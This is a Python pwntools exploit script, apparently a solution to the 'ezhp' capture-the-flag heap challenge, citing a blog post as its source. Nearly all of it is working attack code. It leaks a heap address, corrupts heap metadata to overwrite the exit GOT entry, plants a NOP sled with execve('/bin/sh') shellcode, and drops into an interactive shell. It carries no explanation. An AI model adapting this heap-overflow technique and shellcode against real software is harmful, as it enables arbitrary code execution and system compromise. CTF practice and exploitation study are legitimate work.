# http://nextline.tistory.com/104
from pwn import *

e = ELF('./ezhp')
s = process('./ezhp')

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"


def leak():

	s.recvuntil('on.\n')
	s.sendline('3')

	s.recvuntil('id.\n')
	s.sendline('0')

	s.recvuntil('ze.\n')
	s.sendline('28')

	s.recvuntil('ta.\n')
	s.sendline('A' * 28)

	s.recvuntil('on.\n')
	s.sendline('4')

	s.recvuntil('id.\n')
	s.sendline('0')

	return (u32(s.recvline()[28:32]) + 0xc)

def exploit():
	for i in range(0,3):
		s.recvuntil('on.\n')
		s.sendline('1')

		s.recvuntil('ze.\n')
		s.sendline('12')

	leak_add = leak()

	print '[+] LEAK ADD : ' + hex(leak_add)

	# exit_got overwrite
	s.recvuntil('on.\n')
	s.sendline('3')

	s.recvuntil('id.\n')
	s.sendline('0')

	s.recvuntil('ze.\n')
	s.sendline('36')

	payload = 'A' * 20 + "\xff\xff\xff\xff" * 2
	payload += p32(leak_add) + p32(e.got['exit']-4)
	s.recvuntil('ta.\n')
	s.sendline(payload)

	s.recvuntil('on.\n')
	s.sendline('2')

	s.recvuntil('id.\n')
	s.sendline('1')

	print '[+] GOT OVERWRITE'

	# set shell code
	s.recvuntil('on.\n')
	s.sendline('3')

	s.recvuntil('id.\n')
 	s.sendline('2')

	s.recvuntil('ze.\n')
	s.sendline('124')

	s.recvuntil('ta.\n')
	s.sendline('\x90' * 100 + shellcode + "\x00")

	print '[+] SET SHELL CODE'

	s.recvuntil('on.\n')
	s.sendline('A')

	print '[+] Get Shell!'

	s.interactive()

def main():
	exploit()

if __name__ == "__main__":
	main()
